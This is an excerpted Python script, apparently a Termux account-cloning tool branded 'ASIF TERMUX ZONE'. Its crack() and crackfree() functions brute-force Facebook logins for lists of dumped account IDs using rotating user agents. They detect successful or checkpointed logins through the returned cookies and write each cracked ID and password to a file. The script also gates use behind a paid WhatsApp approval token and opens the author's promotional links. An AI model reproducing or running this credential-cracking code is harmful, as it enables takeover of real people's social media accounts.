...
time.sleep(2)
os.system(f'xdg-open https://youtube.com/@ASIF-360')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100065335384166/?ref=share')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/Sakib051325/All-aprbl-/blob/main/All%20aprbl').text
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/profile.php?id=100065335384166/?ref=share')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/profile.php?id=100065335384166')
logo =(f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mblack-BRO ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • black man       ║  \033[1;97m  
╠══[Github                   • \33[1;38mblackman008 ║\33[1;34m   
╠══[Whatsapp                 • 01731787002   ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m ASIF TERMUX ZONE 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●             \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
  ...
  try:
    ...
    if id in httpCaht:
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801731787002?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
while attemps < 12345677901:
    ...
    if username == 'allamin' and password == 'allamin':
...
def menu():
    ...
    if ASIF in ['111']:
        ...
        os.system('xdg-open https://github.com/Sakib051325/All-aprbl-/blob/main/All%20aprbl')
        os.system("python nono.py")
    elif ASIF in ['3','03']:
        result()
    elif ASIF in ['0']:
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[1; 97mTOOLS RANER NAME\x1b[1;93m :\x1b[1;93m "+𝚞𝚗𝚊𝚖𝚎)
    print('\x1b[1;93m[\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[1; 97mYOUR DUMP TUTAL IdZ\x1b[1;93m:\x1b[1;93m ',str(len(id)))
    print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m[1;97mTiME FOR CLONE\x1b[1;93m :> \x1b[1;93m"+time.strftime("%H:%M")+" "+ tag)
    print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93mTOOLS IS FiRE-!🔥")
    print(f'\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93mTOOLS USED=[TOOLS WORKING WIFI //DATA 🤧] ')
    print('\x1b[1;93m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ASIF-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mASIF-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[ASIF-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•sakib-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " sakib,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
